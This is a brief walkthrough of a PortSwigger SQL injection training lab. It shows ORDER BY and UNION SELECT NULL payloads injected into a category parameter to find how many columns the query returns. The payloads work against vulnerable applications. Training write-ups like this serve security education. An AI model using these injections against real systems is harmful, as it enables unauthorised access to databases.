# Lab: SQL injection UNION attack, determining the number of columns returned by the query - [Click](https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns)


## Steps

1. **Access the Lab**  
   - Click the "Accessories" category to send: `GET /filter?category=Accessories`.  
   - Capture the request in Burp Suite.

2. **Determine Number of Columns**  
   - Inject `ORDER BY` to test column count:  
     - `category=Accessories' ORDER BY 1--`: 200 OK.  
     - `category=Accessories' ORDER BY 2--`: 200 OK.  
     - `category=Accessories' ORDER BY 3--`: 200 OK.  
     - `category=Accessories' ORDER BY 4--`: 500 Error.  
   - **Result**: Query returns 3 columns.

3. **Test Data Types**  
   - Inject: `category=Accessories' UNION SELECT NULL,NULL,NULL--`.  
   - **Result**: 200 OK, confirming the query accepts 3 NULL columns.
   - The lab is solved
